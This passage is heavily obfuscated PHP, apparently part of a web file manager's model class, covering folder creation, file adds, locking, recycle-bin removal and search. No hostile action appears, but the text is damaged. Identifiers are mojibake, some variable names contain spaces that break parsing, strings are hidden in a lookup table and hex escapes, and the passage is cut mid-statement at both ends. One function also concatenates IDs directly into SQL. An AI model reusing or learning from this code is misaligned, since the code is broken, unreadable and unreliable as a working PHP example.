$½•Ú´‘Š[12], $õšºµ™÷); $õšºµ™÷ = $½•Ú´‘Š[490] . str_replace($½•Ú´‘Š[50], $½•Ú´‘Š[491], $õšºµ™÷); $û»¾ãÈé = $ŞÆêàøÉ[$½•Ú´‘Š[32]]; unset($ŞÆêàøÉ[$½•Ú´‘Š[32]]); foreach ($ŞÆêàøÉ as $¬¨Ã†Œ => $ÃêíÊ¿) { $ò±³â—×[$½•Ú´‘Š[490] . $¬¨Ã†Œ] = $ÃêíÊ¿; } foreach ($û»¾ãÈé as $Ÿ¨×ĞÀØ) { $ò±³â—×[] = array($½•Ú´‘Š[495] => $Ÿ¨×ĞÀØ, $½•Ú´‘Š[1041] => $½•Ú´‘Š[1986], array($½•Ú´‘Š[2154] => $Ÿ¨×ĞÀØ, $½•Ú´‘Š[2155] => array($½•Ú´‘Š[7], array($½•Ú´‘Š[517], $½•Ú´‘Š[516])))); } $this->join($‚üÚ€¤Ñ); $ŞÆêàøÉ = $ò±³â—×; } private function _parseSearchWhere($…Æİ€›ì) { $˜Ò©Ã‹£ =& $_SERVER[ •ŒÓîÆ]; $é‰É˜¶ = array(); if (isset($…Æİ€›ì[$˜Ò©Ã‹£[801]]) && $…Æİ€›ì[$˜Ò©Ã‹£[801]]) { $é‰É˜¶[$˜Ò©Ã‹£[87]] = array($˜Ò©Ã‹£[2156], $…Æİ€›ì[$˜Ò©Ã‹£[801]]); } if (isset($…Æİ€›ì[$˜Ò©Ã‹£[802]]) && $…Æİ€›ì[$˜Ò©Ã‹£[802]]) { $»Ò³“µè = array($˜Ò©Ã‹£[2157], $…Æİ€›ì[$˜Ò©Ã‹£[802]]); if ($é‰É˜¶[$˜Ò©Ã‹£[87]]) { $é‰É˜¶[$˜Ò©Ã‹£[87]] = array($é‰É˜¶[$˜Ò©Ã‹£[87]], $»Ò³“µè, $˜Ò©Ã‹£[2158]); } else { $é‰É˜¶[$˜Ò©Ã‹£[87]] = $»Ò³“µè; } } if (isset($…Æİ€›ì[$˜Ò©Ã‹£[2150]]) && $…Æİ€›ì[$˜Ò©Ã‹£[2150]] > 0) { $é‰É˜¶[$˜Ò©Ã‹£[78]] = array($˜Ò©Ã‹£[2156], $…Æİ€›ì[$˜Ò©Ã‹£[2150]]); } if (isset($…Æİ€›ì[$˜Ò©Ã‹£[2151]]) && $…Æİ€›ì[$˜Ò©Ã‹£[2151]]) { $»Ò³“µè = array($˜Ò©Ã‹£[2157], $…Æİ€›ì[$˜Ò©Ã‹£[2151]]); if ($é‰É˜¶[$˜Ò©Ã‹£[78]]) { $é‰É˜¶[$˜Ò©Ã‹£[78]] = array($é‰É˜¶[$˜Ò©Ã‹£[78]], $»Ò³“µè, $˜Ò©Ã‹£[2158]); } else { $é‰É˜¶[$˜Ò©Ã‹£[78]] = $»Ò³“µè; } } if (isset($…Æİ€›ì[$˜Ò©Ã‹£[642]]) && $…Æİ€›ì[$˜Ò©Ã‹£[642]]) { $é‰É˜¶[] = array($˜Ò©Ã‹£[508] => $…Æİ€›ì[$˜Ò©Ã‹£[642]], $˜Ò©Ã‹£[506] => $…Æİ€›ì[$˜Ò©Ã‹£[642]], $˜Ò©Ã‹£[1041] => $˜Ò©Ã‹£[1986]); } if (isset($…Æİ€›ì[$˜Ò©Ã‹£[465]]) && $…Æİ€›ì[$˜Ò©Ã‹£[465]]) { $Ïè¶æğ = $…Æİ€›ì[$˜Ò©Ã‹£[465]]; if ($Ïè¶æğ == $˜Ò©Ã‹£[77]) { $é‰É˜¶[$˜Ò©Ã‹£[464]] = 1; } else { if ($Ïè¶æğ == $˜Ò©Ã‹£[2159]) { $é‰É˜¶[$˜Ò©Ã‹£[464]] = 0; } else { if ($Ïè¶æğ) { $Ïè¶æğ = is_array($Ïè¶æğ) ? $Ïè¶æğ : explode($˜Ò©Ã‹£[50], $Ïè¶æğ); $é‰É˜¶[$˜Ò©Ã‹£[465]] = array($˜Ò©Ã‹£[471], $Ïè¶æğ); $é‰É˜¶[$˜Ò©Ã‹£[464]] = 0; } } } } $this->_parseSearchParent($…Æİ€›ì, $é‰É˜¶); if (isset($…Æİ€›ì[$˜Ò©Ã‹£[1982]]) && trim($…Æİ€›ì[$˜Ò©Ã‹£[1982]])) { $À¼ëÏó = trim($…Æİ€›ì[$˜Ò©Ã‹£[1982]]); $½Ñ£„ƒ¾ = explode($˜Ò©Ã‹£[53], $À¼ëÏó); if (strlen($À¼ëÏó) > 2 && (substr($À¼ëÏó, 0, 1) == $˜Ò©Ã‹£[120] && substr($À¼ëÏó, -1) == $˜Ò©Ã‹£[120]) || substr($À¼ëÏó, 0, 1) == $˜Ò©Ã‹£[58] && substr($À¼ëÏó, -1) == $˜Ò©Ã‹£[58]) { $À¼ëÏó = substr($À¼ëÏó, 1, -1); $½Ñ£„ƒ¾ = array($À¼ëÏó); } $é‰É˜¶[$˜Ò©Ã‹£[32]] = array(array($˜Ò©Ã‹£[592], $˜Ò©Ã‹£[1984] . $À¼ëÏó . $˜Ò©Ã‹£[1984])); if (count($½Ñ£„ƒ¾) > 1) { $é‰É˜¶[$˜Ò©Ã‹£[32]] = array(); foreach ($½Ñ£„ƒ¾ as $×Ñ—¶¡Û) { if (!trim($×Ñ—¶¡Û)) { continue; } $é‰É˜¶[$˜Ò©Ã‹£[32]][] = array($˜Ò©Ã‹£[592], $˜Ò©Ã‹£[1984] . trim($×Ñ—¶¡Û) . $˜Ò©Ã‹£[1984]); } } } return $é‰É˜¶; } private function _parseSearchParent($úšÆİ˜ö, &$Äº‚ÓÈ«) { $ŒÈ™şõ =& $_SERVER[ •ŒÓîÆ]; if (!isset($úšÆİ˜ö[$ŒÈ™şõ[182]]) || !$úšÆİ˜ö[$ŒÈ™şõ[182]]) { return; } $ğûµ¸…Í = $this->pathInfo($úšÆİ˜ö[$ŒÈ™şõ[182]]); $™¾Š¼‡ = $ğûµ¸…Í[$ŒÈ™şõ[182]] . $ŒÈ™şõ[12] === $ŒÈ™şõ[214]; $«ìî¢ò‰ = $ğûµ¸…Í[$ŒÈ™şõ[180]] == $ŒÈ™şõ[559]; if ($ğûµ¸…Í[$ŒÈ™şõ[576]] == $ŒÈ™şõ[577]) { $©Ó¤¡ = $this->sourceInfo($úšÆİ˜ö[$ŒÈ™şõ[182]]); $ğûµ¸…Í[$ŒÈ™şõ[565]] = $©Ó¤¡[$ŒÈ™şõ[565]]; } $Äº‚ÓÈ«[$ŒÈ™şõ[632]] = array($ŒÈ™şõ[592], $ğûµ¸…Í[$ŒÈ™şõ[565]] . $úšÆİ˜ö[$ŒÈ™şõ[182]] . $ŒÈ™şõ[593]); $şï¦Ï ß = isset($úšÆİ˜ö[$ŒÈ™şõ[1847]]) && in_array($ŒÈ™şõ[559], $úšÆİ˜ö[$ŒÈ™şõ[1847]]); if (!$şï¦Ï ß || !$«ìî¢ò‰ || !$™¾Š¼‡ || !$ğûµ¸…Í[$ŒÈ™şõ[466]]) { return; } if (!AuthModel::authCheckRoot($ğûµ¸…Í[$ŒÈ™şõ[466]][$ŒÈ™şõ[467]])) { return; } $÷éş­Ğ‡ = $ğûµ¸…Í[$ŒÈ™şõ[550]] . $ŒÈ™şõ[12]; if ($÷éş­Ğ‡ == $ŒÈ™şõ[90]) { unset($Äº‚ÓÈ«[$ŒÈ™şõ[632]]); $Äº‚ÓÈ«[$ŒÈ™şõ[180]] = self::TYPE_GROUP; return; } $Îı«ó¢é = Model($ŒÈ™şõ[566])->groupChildrenAll($÷éş­Ğ‡); $™Ô”üÁÓ = count($Îı«ó¢é); if ($™Ô”üÁÓ <= 1) { return; } $¡¿¦¸ˆ» = array($ŒÈ™şõ[182] => 0, $ŒÈ™şõ[180] => self::TYPE_GROUP, $ŒÈ™şõ[550] => array($ŒÈ™şõ[7], $Îı«ó¢é)); $İÕ¢şÄœ = $this->field($ŒÈ™şõ[2160])->where($¡¿¦¸ˆ»)->limit($™Ô”üÁÓ)->select(); $Äº‚ÓÈ«[$ŒÈ™şõ[632]] = array(); foreach ($İÕ¢şÄœ as $ïİÒØ©°) { $Äº‚ÓÈ«[$ŒÈ™şõ[632]][] = array($ŒÈ™şõ[592], $ŒÈ™şõ[575] . $ïİÒØ©°[$ŒÈ™şõ[183]] . $ŒÈ™şõ[593]); } $Äº‚ÓÈ«[$ŒÈ™şõ[632]][] = $ŒÈ™şõ[1986]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Õ©öîÜ) { $Ğ‘›Ïë =& $_SERVER[ •ŒÓîÆ]; $²Òñ´¶® = Model($Ğ‘›Ïë[558])->where(array($Ğ‘›Ïë[1681] => $Õ©öîÜ))->find(); $„éÔÑş = $this->_mkdirRoot(SourceModel::TYPE_USER, $Õ©öîÜ, $²Òñ´¶®[$Ğ‘›Ïë[32]]); $this->userDesktopAdd($„éÔÑş); return $„éÔÑş; } public function userDesktopAdd($¤½«ş÷Ÿ) { $…¬µ¸æ‹ =& $_SERVER[ •ŒÓîÆ]; $ñà–›‘ = LNG($…¬µ¸æ‹[2161]); $Ï„îï–À = $this->mkdir($¤½«ş÷Ÿ, $ñà–›‘); $this->metaSet($Ï„îï–À, $…¬µ¸æ‹[2162], $…¬µ¸æ‹[90]); $this->metaSet($¤½«ş÷Ÿ, $…¬µ¸æ‹[2163], $Ï„îï–À); } public function userPathSafeAdd($—÷âŒì¤) { $É´ÆÍ£ =& $_SERVER[ •ŒÓîÆ]; $³¹¤†«¥ = Model($É´ÆÍ£[558])->getInfoFull($—÷âŒì¤); if (!$³¹¤†«¥) { return !1; } if (_get($³¹¤†«¥, $É´ÆÍ£[580])) { return $³¹¤†«¥[$É´ÆÍ£[518]][$É´ÆÍ£[2164]]; } $í“¤°ù» = $this->_mkdirRoot(SourceModel::TYPE_USER, $—÷âŒì¤, $É´ÆÍ£[2165], $É´ÆÍ£[485]); Model($É´ÆÍ£[558])->metaSet($—÷âŒì¤, $É´ÆÍ£[2164], $í“¤°ù»); $this->metaSet($í“¤°ù», $É´ÆÍ£[2166], $—÷âŒì¤); return $í“¤°ù»; } public function groupRootAdd($ßÂ‹¦ïö) { $ÇŸÄâÃ =& $_SERVER[ •ŒÓîÆ]; $Öß§Ê¤Â = Model($ÇŸÄâÃ[566])->where(array($ÇŸÄâÃ[1976] => $ßÂ‹¦ïö))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ßÂ‹¦ïö, $Öß§Ê¤Â[$ÇŸÄâÃ[32]]); } public function systemRootPathAdd($ïáñŸ£å) { if ($ïáñŸ£å != $_SERVER[ •ŒÓîÆ][586]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ïáñŸ£å); } public function userRootRemove($¿™¾ÙÇ) { $°Ší¬ì = $this->targetSourceRoot(SourceModel::TYPE_USER, $¿™¾ÙÇ, !0); foreach ($°Ší¬ì as $Ëˆ¦×Ô–) { if (!$Ëˆ¦×Ô–) { continue; } $this->remove($Ëˆ¦×Ô–[$_SERVER[ •ŒÓîÆ][183]], !1); } } public function groupRootRemove($ã”š‰â›) { $åÕË¢¢Ú = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ã”š‰â›); if (!$åÕË¢¢Ú) { return; } $this->remove($åÕË¢¢Ú[$_SERVER[ •ŒÓîÆ][183]], !1); } private function _mkdirRoot($ˆæÚå€ğ, $‹µø¯ÎÃ, $¾Ì„Æˆà, $ğØİÎ = '') { $Ï†şüÀÃ =& $_SERVER[ •ŒÓîÆ]; $ß¢Ìã¯ğ = defined($Ï†şüÀÃ[2109]) ? USER_ID : 0; $¬ûõ“ˆ = array($Ï†şüÀÃ[456] => 0, $Ï†şüÀÃ[628] => $ˆæÚå€ğ, $Ï†şüÀÃ[629] => $‹µø¯ÎÃ, $Ï†şüÀÃ[626] => 1, $Ï†şüÀÃ[630] => $ß¢Ìã¯ğ, $Ï†şüÀÃ[631] => $ß¢Ìã¯ğ, $Ï†şüÀÃ[627] => $ğØİÎ, $Ï†şüÀÃ[632] => $Ï†şüÀÃ[575], $Ï†şüÀÃ[483] => 0, $Ï†şüÀÃ[597] => 0, $Ï†şüÀÃ[521] => 0, $Ï†şüÀÃ[633] => $Ï†şüÀÃ[12]); if ($Ãä¡Ú¾Ó = $this->where($¬ûõ“ˆ)->find()) { return $Ãä¡Ú¾Ó[$Ï†şüÀÃ[183]]; } $¸†Ü»¢ê = "\x4d\157\x64\x65\154\x53\x6f\165\162\143\x65\x2e\x6d\153\144\151\x72\x52\157\157\164\x2e{$ˆæÚå€ğ}\56{$‹µø¯ÎÃ}\56" . $¾Ì„Æˆà; CacheLock::lock($¸†Ü»¢ê); $¬ûõ“ˆ[$Ï†şüÀÃ[32]] = $¾Ì„Æˆà; $ğùïÈá¯ = $this->add($¬ûõ“ˆ); $Å‡¶²Ğ² = array($Ï†şüÀÃ[634] => short_id($ğùïÈá¯)); $this->where(array($Ï†şüÀÃ[470] => $ğùïÈá¯))->save($Å‡¶²Ğ²); CacheLock::unlock($¸†Ü»¢ê); return $ğùïÈá¯; } private function targetSourceRoot($Œ¡®¯Ùƒ, $ÒääÉ¹Œ, $Š„Œ³Š = false) { $Ğê½‚¨ =& $_SERVER[ •ŒÓîÆ]; $²¶èö† = array($Ğê½‚¨[456] => 0, $Ğê½‚¨[628] => $Œ¡®¯Ùƒ, $Ğê½‚¨[629] => $ÒääÉ¹Œ); if ($Š„Œ³Š) { $«ÚŒÓÕ = $this->where($²¶èö†)->select(); return $«ÚŒÓÕ ? $«ÚŒÓÕ : array(); } $ëŞØ— = $this->where($²¶èö†)->find(); return $ëŞØ— ? $ëŞØ— : array(); } public function sourceRootGroup($–Ù¤—Şù) { $°ÎüèÁˆ =& $_SERVER[ •ŒÓîÆ]; if (is_string($–Ù¤—Şù)) { $–Ù¤—Şù = array($–Ù¤—Şù); } $„ ã÷ÊÊ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $–Ù¤—Şù, $°ÎüèÁˆ[205]); $Š¦ƒ¼À = array($°ÎüèÁˆ[424] => $„ ã÷ÊÊ, $°ÎüèÁˆ[421] => array($°ÎüèÁˆ[799] => count($–Ù¤—Şù))); $this->_listDataApply($Š¦ƒ¼À[$°ÎüèÁˆ[424]]); $this->_listMake($Š¦ƒ¼À); return array_to_keyvalue($Š¦ƒ¼À[$°ÎüèÁˆ[84]], $°ÎüèÁˆ[550]); } public function mkfile($ƒ¿ÉÅ´Ê, $Ò°šŞà², $³·©ıÂÙ = '', $è””ş•Å = REPEAT_RENAME) { $­´ÅÄç½ =& $_SERVER[ •ŒÓîÆ]; $àºŞú = Model($­´ÅÄç½[654])->addFileByContent($³·©ıÂÙ, $Ò°šŞà²); return $this->_createFileCall($ƒ¿ÉÅ´Ê, $Ò°šŞà², $àºŞú, $è””ş•Å, $­´ÅÄç½[1384]); } public function addFile($Û­âŸŸ, $Œ”êÇËå, $àÊˆâş, $õ¯„¢ = false, $ÔãûÓì = REPEAT_RENAME) { $ÖÛÛ€ÛØ = Model($_SERVER[ •ŒÓîÆ][654])->addFile($Œ”êÇËå, $àÊˆâş, $õ¯„¢); return $this->_createFileCall($Û­âŸŸ, $àÊˆâş, $ÖÛÛ€ÛØ, $ÔãûÓì); } public function addFileByFileID($ëçÍÇè, $Şõá—§ì, $şº êœğ, $ÒäÔÔû = REPEAT_RENAME) { $¯¦­²”« =& $_SERVER[ •ŒÓîÆ]; $¿™Úâ· = Model($¯¦­²”«[654])->find($Şõá—§ì); Model($¯¦­²”«[654])->linkAdd($Şõá—§ì); return $this->_createFileCall($ëçÍÇè, $şº êœğ, $¿™Úâ·, $ÒäÔÔû); } public function addFileByRemote($à¨Ó”Ìå, $¸‡°àÆ, $ò”†ıææ, $°Ş×‚ù = array(), $ˆÇ‹©Ë = REPEAT_RENAME) { $”ğö° = Model($_SERVER[ •ŒÓîÆ][654])->addFileByRemote($¸‡°àÆ, $ò”†ıææ, $°Ş×‚ù); return $this->_createFileCall($à¨Ó”Ìå, $ò”†ıææ, $”ğö°, $ˆÇ‹©Ë); } private function _createFileCall($š†, $İÜüŒŞÚ, $¿ÄÎŒñÑ, $§—ƒìè„, $Œ¶°”® = "\x75\160\154\157\x61\x64") { $²­ÒÔÇà =& $_SERVER[ •ŒÓîÆ]; $¾Íİõ€á = !1; $this->setMasterDB(); $this->lockWriteStart($š†, $İÜüŒŞÚ); $ÏË›“½ = $this->fileNameExist($š†, $İÜüŒŞÚ); $ˆ€ÈìÔÕ = $this->_createFile($š†, $İÜüŒŞÚ, $¿ÄÎŒñÑ, $§—ƒìè„, $¾Íİõ€á); if (!$¾Íİõ€á) { Model($²­ÒÔÇà[523])->remove($¿ÄÎŒñÑ[$²­ÒÔÇà[520]]); } if ($¾Íİõ€á && $ˆ€ÈìÔÕ && $ˆ€ÈìÔÕ != $ÏË›“½) { Model($²­ÒÔÇà[2134])->eventCreate($ˆ€ÈìÔÕ, $Œ¶°”®); } $this->lockWriteEnd($š†, $İÜüŒŞÚ); return $ˆ€ÈìÔÕ; } public function mkdir($£ì¨¦Õ“, $şŠâğ÷Ñ, $›´¿°Â¦ = REPEAT_SKIP) { $º˜÷ªˆ¨ =& $_SERVER[ •ŒÓîÆ]; $this->setMasterDB(); $¬àÛ½å = $this->sourceInfo($£ì¨¦Õ“); if (!$¬àÛ½å) { return !1; } $this->lockWriteStart($£ì¨¦Õ“, $şŠâğ÷Ñ); if ($›´¿°Â¦ !== !1) { $×„º’« = $this->fileNameExist($£ì¨¦Õ“, $şŠâğ÷Ñ); if ($×„º’« && $›´¿°Â¦ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($£ì¨¦Õ“, $şŠâğ÷Ñ); return $×„º’«; } $şŠâğ÷Ñ = $this->fileNameAuto($£ì¨¦Õ“, $şŠâğ÷Ñ, $›´¿°Â¦); } $Ã¬á× = array($º˜÷ªˆ¨[626] => 1, $º˜÷ªˆ¨[473] => $şŠâğ÷Ñ, $º˜÷ªˆ¨[627] => $º˜÷ªˆ¨[12], $º˜÷ªˆ¨[521] => 0, $º˜÷ªˆ¨[597] => 0); $èªâ¹çË = $this->_addSource($Ã¬á×, $¬àÛ½å); Model($º˜÷ªˆ¨[2134])->eventCreate($èªâ¹çË, $º˜÷ªˆ¨[1385]); $this->lockWriteEnd($£ì¨¦Õ“, $şŠâğ÷Ñ); return $èªâ¹çË; } public function listSourceRoot($Â¶Õ©£, $ÑæÃ”Şà, $ä±±çÇŞ = "\x73\157\x75\162\143\x65\x49\x44\54\x74\141\162\147\145\164\x49\x44\x2c\x73\x69\x7a\145") { $·÷ãé£¶ =& $_SERVER[ •ŒÓîÆ]; $•Ì´ªü = $·÷ãé£¶[263]; $ªì¯œ˜œ = array(); $¡à§Ù“ì = 1024 * 50; $§‹´©ÆÀ = is_array($§‹´©ÆÀ) ? $§‹´©ÆÀ : array(); $€ÁĞ°Şş = count($ÑæÃ”Şà); $¾ÌŞØÌë = $this->tablePrefix . $·÷ãé£¶[2167]; for ($‘ˆÊô€¾ = 0; $‘ˆÊô€¾ < $€ÁĞ°Şş; $‘ˆÊô€¾++) { $ê¨¬˜¶Ñ = $ÑæÃ”Şà[$‘ˆÊô€¾]; $•Ì´ªü .= "\123\105\x4c\x45\103\x54\40\x2a\x20\x46\x52\x4f\115\x20\x28\x53\105\x4c\105\103\x54\40{$ä±±çÇŞ}\x20\106\122\x4f\x4d\40\140{$¾ÌŞØÌë}\x60\x20\127\x48\x45\122\x45\x20"; $•Ì´ªü .= "\x60\160\x61\162\x65\156\164\111\x44\140\75\60\x20\x41\x4e\104\40\140\164\x61\162\x67\145\x74\x49\104\140\x3d{$ê¨¬˜¶Ñ}\x20\101\x4e\104\40\140\x74\141\162\147\145\x74\x54\x79\x70\145\140\x3d{$Â¶Õ©£}\40\141\156\144\40\x66\x69\154\145\x54\171\x70\145\x3d\x27\x27\40\x6c\x69\x6d\x69\x74\x20\x31\x29\40\141\163\x20\x74\x62\x5f{$‘ˆÊô€¾}\40\x55\x4e\111\x4f\116\40\x41\114\114\x20"; if ((strlen($•Ì´ªü) >= $¡à§Ù“ì || $‘ˆÊô€¾ == $€ÁĞ°Şş - 1) && $•Ì´ªü) { $•Ì´ªü = substr($•Ì´ªü, 0, -strlen($·÷ãé£¶[1079])); $ù‡Â¾× = $this->query($•Ì´ªü); $•Ì´ªü = $·÷ãé£¶[12]; $ªì¯œ˜œ = array_merge($ªì¯œ˜œ, $ù‡Â¾×); } } return $ªì¯œ˜œ; } private function _createFile($–áˆ€Í, $Úš½¸¯¤, $ÅıûË®, $·È’òÙ, &$±æ•½ùÍ) { $‰Çù×­¹ =& $_SERVER[ •ŒÓîÆ]; $±Òı­ç¢ = $this->sourceInfo($–áˆ€Í); if (!$ÅıûË® || !$±Òı­ç¢) { return !1; } if ($·È’òÙ !== !1) { $Ø‰¦ï¢ = $this->fileNameExist($–áˆ€Í, $Úš½¸¯¤); } $±æ•½ùÍ = !0; if ($·È’òÙ && $Ø‰¦ï¢) { if ($·È’òÙ == REPEAT_SKIP) { $±æ•½ùÍ = !1; return $Ø‰¦ï¢; } else { if ($·È’òÙ == REPEAT_REPLACE) { $Ş’ãËèè = $this->sourceInfo($Ø‰¦ï¢); $¿‹ßú¯İ = $this->fileHistory($Ş’ãËèè, $ÅıûË®[$‰Çù×­¹[520]], $ÅıûË®[$‰Çù×­¹[78]]); if (!$¿‹ßú¯İ) { $±æ•½ùÍ = !1; } else { $this->folderSizeReset($–áˆ€Í); } return $Ø‰¦ï¢; } else { $Úš½¸¯¤ = $this->fileNameAuto($–áˆ€Í, $Úš½¸¯¤, $·È’òÙ, !1); } } } $ıé»ƒá… = array($‰Çù×­¹[626] => 0, $‰Çù×­¹[473] => $Úš½¸¯¤, $‰Çù×­¹[627] => substr(get_path_ext($Úš½¸¯¤), 0, 10), $‰Çù×­¹[521] => $ÅıûË®[$‰Çù×­¹[520]], $‰Çù×­¹[597] => $ÅıûË®[$‰Çù×­¹[78]]); $éÁãˆôğ = $this->_addSource($ıé»ƒá…, $±Òı­ç¢); $this->folderSizeReset($–áˆ€Í, intval($ıé»ƒá…[$‰Çù×­¹[78]])); return $éÁãˆôğ; } protected function fileHistory($£‘‹ö½®, $Å†¨œ, $¢ÑÌ§²) { $ıììñí =& $_SERVER[ •ŒÓîÆ]; if ($£‘‹ö½®[$ıììñí[520]] == $Å†¨œ) { return !1; } $this->checkLock($£‘‹ö½®[$ıììñí[183]], $Å†¨œ); Model($ıììñí[2168])->addHistory($£‘‹ö½®); $ˆˆİÏÙˆ = array($ıììñí[631] => USER_ID, $ıììñí[477] => time(), $ıììñí[520] => $Å†¨œ, $ıììñí[78] => $¢ÑÌ§²); $this->where(array($ıììñí[470] => $£‘‹ö½®[$ıììñí[183]]))->save($ˆˆİÏÙˆ); $this->sourceCacheClear($£‘‹ö½®[$ıììñí[183]]); return !0; } public function checkLock($®”ë¢èÁ, $¦©Ñæ˜Ò) { $“Æ÷äÎİ =& $_SERVER[ •ŒÓîÆ]; $²‰ßš›İ = $this->pathInfo($®”ë¢èÁ); if (!$this->fileIsLock($²‰ßš›İ, !0)) { return; } $­ì«»î = Session::get($“Æ÷äÎİ[2169]); $òåë×ú“ = substr($²‰ßš›İ[$“Æ÷äÎİ[32]], 0, -1 - strlen($²‰ßš›İ[$“Æ÷äÎİ[177]])) . $“Æ÷äÎİ[1249] . $­ì«»î . $“Æ÷äÎİ[10] . $²‰ßš›İ[$“Æ÷äÎİ[177]]; $ßÊ™ãë = Model($“Æ÷äÎİ[654])->find($¦©Ñæ˜Ò); $this->_createFileCall($²‰ßš›İ[$“Æ÷äÎİ[182]], $òåë×ú“, $ßÊ™ãë, REPEAT_REPLACE, $“Æ÷äÎİ[1384]); $¢İ”‡¥ = $²‰ßš›İ[$“Æ÷äÎİ[518]][$“Æ÷äÎİ[590]]; $ÙÔËòó = $¢İ”‡¥[$“Æ÷äÎİ[2170]] ? $¢İ”‡¥[$“Æ÷äÎİ[2170]] : $¢İ”‡¥[$“Æ÷äÎİ[32]]; show_json(LNG($“Æ÷äÎİ[2171]) . $“Æ÷äÎİ[2172] . LNG($“Æ÷äÎİ[2173]) . $“Æ÷äÎİ[2174] . $ÙÔËòó . $“Æ÷äÎİ[2175], !1); } public function fileIsLock($Ôš¬öìö, $¡ªõ¾Œ = false) { $à‰ïšÏ˜ =& $_SERVER[ •ŒÓîÆ]; if (!isset($Ôš¬öìö[$à‰ïšÏ˜[518]]) || !$Ôš¬öìö[$à‰ïšÏ˜[518]][$à‰ïšÏ˜[587]]) { return !1; } if ($Ôš¬öìö[$à‰ïšÏ˜[518]][$à‰ïšÏ˜[587]] != USER_ID) { return !0; } $ÈğøÂÔ¼ = $GLOBALS[$à‰ïšÏ˜[6]][$à‰ïšÏ˜[91]][$à‰ïšÏ˜[588]]; if ($Ôš¬öìö[$à‰ïšÏ˜[518]][$à‰ïšÏ˜[589]] <= time() - $ÈğøÂÔ¼) { $this->metaSet($Ôš¬öìö[$à‰ïšÏ˜[183]], $à‰ïšÏ˜[587], null); $this->metaSet($Ôš¬öìö[$à‰ïšÏ˜[183]], $à‰ïšÏ˜[589], null); } if ($¡ªõ¾Œ) { $this->metaSet($Ôš¬öìö[$à‰ïšÏ˜[183]], $à‰ïšÏ˜[589], time()); } return !1; } private function _addSource($˜Ú¥Ú¿, $«­œÛŞ) { $¯·öİ²ğ =& $_SERVER[ •ŒÓîÆ]; $¬­£Ÿ´á = defined($¯·öİ²ğ[2109]) ? USER_ID : 0; $ö®Ü¿ê = array($¯·öİ²ğ[628] => $«­œÛŞ[$¯·öİ²ğ[180]], $¯·öİ²ğ[629] => $«­œÛŞ[$¯·öİ²ğ[550]], $¯·öİ²ğ[630] => $¬­£Ÿ´á, $¯·öİ²ğ[631] => $¬­£Ÿ´á, $¯·öİ²ğ[456] => $«­œÛŞ[$¯·öİ²ğ[183]], $¯·öİ²ğ[632] => $«­œÛŞ[$¯·öİ²ğ[565]] . $«­œÛŞ[$¯·öİ²ğ[183]] . $¯·öİ²ğ[50], $¯·öİ²ğ[483] => 0, $¯·öİ²ğ[633] => $¯·öİ²ğ[12]); $˜Ú¥Ú¿ = array_merge($ö®Ü¿ê, $˜Ú¥Ú¿); $this->updateModifyTime($˜Ú¥Ú¿[$¯·öİ²ğ[182]]); $ó§¸Ç¡â = $¯·öİ²ğ[2176] . $«­œÛŞ[$¯·öİ²ğ[183]]; if (isset(self::$cacheChildList[$ó§¸Ç¡â])) { unset(self::$cacheChildList[$ó§¸Ç¡â]); } static $Å¥©Ë = false; if (!$Å¥©Ë) { Hook::trigger($¯·öİ²ğ[616], $˜Ú¥Ú¿); $Å¥©Ë = !0; } $ûØš“¦» = $this->add($˜Ú¥Ú¿); $ŠÏ·ûÒÈ = array($¯·öİ²ğ[634] => short_id($ûØš“¦»)); $this->where(array($¯·öİ²ğ[470] => $ûØš“¦»))->save($ŠÏ·ûÒÈ); $this->setNamePinyin($ûØš“¦», $˜Ú¥Ú¿[$¯·öİ²ğ[32]]); return $ûØš“¦»; } public function remove($™Ôè»Çå, $¾–ûÆÇ = true) { $Æğ€´ô =& $_SERVER[ •ŒÓîÆ]; $°ÍÇı¢ü = $this->sourceInfo($™Ôè»Çå); $Ë’ÆÖ¹ã = intval($°ÍÇı¢ü[$Æğ€´ô[180]]) === self::TYPE_SYSTEM; $£ëûè£ï = Model($Æğ€´ô[487])->get($Æğ€´ô[2177]) == $Æğ€´ô[90]; if ($Ë’ÆÖ¹ã || $¾–ûÆÇ || !$£ëûè£ï) { return $this->removeNow($™Ôè»Çå, $¾–ûÆÇ); } $Íí¡ô¡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $•½ê«°ª = $°ÍÇı¢ü[$Æğ€´ô[180]] == self::TYPE_USER ? $Æğ€´ô[642] : $Æğ€´ô[559]; if ($•½ê«°ª == $Æğ€´ô[642]) { $·×ƒÊãì = Model($Æğ€´ô[558])->getInfo($°ÍÇı¢ü[$Æğ€´ô[550]]); $öæ¦£ûĞ = !empty($·×ƒÊãì[$Æğ€´ô[2170]]) ? $·×ƒÊãì[$Æğ€´ô[2170]] : $·×ƒÊãì[$Æğ€´ô[32]]; $öæ¦£ûĞ = $Æğ€´ô[315] . $öæ¦£ûĞ . $Æğ€´ô[2178] . $°ÍÇı¢ü[$Æğ€´ô[550]]; } else { $·×ƒÊãì = Model($Æğ€´ô[566])->getInfo($°ÍÇı¢ü[$Æğ€´ô[550]]); $öæ¦£ûĞ = _get($·×ƒÊãì, $Æğ€´ô[32]); $öæ¦£ûĞ = $Æğ€´ô[165] . $öæ¦£ûĞ . $Æğ€´ô[2179] . $°ÍÇı¢ü[$Æğ€´ô[550]]; } $€ÃÜó« = $Æğ€´ô[2180] . md5($öæ¦£ûĞ); CacheLock::lock($€ÃÜó«); $©Ü”º¢ = $this->fileNameExist($Íí¡ô¡, $öæ¦£ûĞ); if (!$©Ü”º¢) { $©Ü”º¢ = $this->mkdir($Íí¡ô¡, $öæ¦£ûĞ, REPEAT_SKIP); $this->metaSet($©Ü”º¢, $Æğ€´ô[2181], $•½ê«°ª); $this->metaSet($©Ü”º¢, $Æğ€´ô[2182], $°ÍÇı¢ü[$Æğ€´ô[550]]); if ($°ÍÇı¢ü[$Æğ€´ô[182]] != 0) { $this->metaSet($©Ü”º¢, $Æğ€´ô[2183], _get($·×ƒÊãì, $Æğ€´ô[2184])); } } CacheLock::unlock($€ÃÜó«); $this->metaSet($™Ôè»Çå, $Æğ€´ô[2185], $°ÍÇı¢ü[$Æğ€´ô[182]]); $this->where(array($Æğ€´ô[183] => $™Ôè»Çå))->save(array($Æğ€´ô[477] => time())); $this->recycleClear($°ÍÇı¢ü); $¦‰‘­— = 